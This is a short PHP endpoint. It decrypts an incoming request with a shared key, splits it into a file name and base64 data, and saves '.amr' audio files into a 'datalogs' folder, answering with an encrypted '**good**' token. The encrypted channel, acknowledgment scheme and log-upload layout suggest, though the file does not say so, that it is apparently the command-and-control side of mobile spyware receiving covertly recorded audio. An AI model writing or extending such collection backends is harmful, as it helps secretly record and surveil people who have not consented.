<?php
include 'crypt.php';
include 'config.php';

$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
$request = mb_substr($request, 0, mb_strlen($request));
$request =  decrypt($request,cryptKey);

$massivReq = explode("||:||", $request);

$namefile =  isset($massivReq[0]) ? $massivReq[0] : "";
$datafile =isset($massivReq[1]) ? $massivReq[1] : "";

if((strlen($namefile)>5)&&(strlen($datafile)>5)){
	if (preg_match("/.amr/",$namefile)){
		$namefile = str_replace(".amr","",$namefile);
		$namefile = str_replace("/","",$namefile);
	  if(preg_match('|^[A-Z0-9:_-]+$|i', $namefile)){
	  	file_put_contents("../".namefolder."/application/datalogs/files/$namefile.amr", base64_decode($datafile));
	  }
}
	$tag = "<tag>";
	$otv = encrypt("**good**",cryptKey);
	$tagend = "</tag>";
	echo "$tag$otv$tagend";
}
?>
